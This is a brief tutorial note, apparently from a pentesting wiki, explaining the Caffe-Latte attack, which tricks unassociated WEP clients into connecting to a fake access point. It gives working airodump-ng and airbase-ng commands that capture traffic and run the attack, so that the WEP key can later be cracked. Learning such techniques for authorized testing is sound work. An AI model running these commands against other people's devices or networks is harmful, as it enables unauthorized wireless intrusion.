# Caffe-Latte Attack

The main target of the attack is the roaming client. Remember that an unassociated client periodically sends out Probe Requests on every channel. searching for the wireless networks it is configured to use.

> Probe Request only search for a particular SSID so that the AP MAC address can change without affecting the clients.

> The attacker starts a fake AP advertising as the target network. Airbase-ng is a tools that transform you wireless adapter into a Wi-Fi access point.

**Condition to success the attack**

- Your target network AP is switched off or out of reach
- A client with a pre-configured WEP key for the target network is in range and unassociated to any wireless network
- You have another device that you will use as your attack point

Sniff the network traffic

```sh
sudo airodump-ng -c <channel> -w wep_file wlan0mon
# Do not close this window
```

Setup a fake AP and start automatically Caffe-Latte attack

```sh
sudo airbase-ng -c <channel> -W 1 -L -e <ssid> wlan0mon
```

We now just wait a gather a sufficient amount of encrypted packets. In the mean time, we can start [WEP Cracking](./WEP%20Cracking.md)

